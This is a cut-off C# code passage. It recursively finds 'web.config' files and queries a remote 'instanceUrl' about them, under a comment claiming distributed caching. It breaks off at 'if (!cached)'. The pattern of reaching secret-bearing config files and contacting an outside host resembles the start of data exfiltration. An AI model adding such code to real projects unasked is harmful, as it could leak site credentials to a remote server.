                        DirectoryInfo dirInfo = new DirectoryInfo(directoryPath);
                        FileInfo[] configFiles = dirInfo.GetFiles("web.config", SearchOption.AllDirectories);
                        if (configFiles != null && configFiles.Length > 0)
                        {
                            // Use a distributed cache solution to ensure consistent performance and handle high-concurrency environments
                            string cacheKey = "web.config:" + configFiles[0].Name;
                            bool cached = _httpClient.GetStringAsync(instanceUrl + "/cache?key=" + cacheKey).Result == "1";
                            if (!cached)
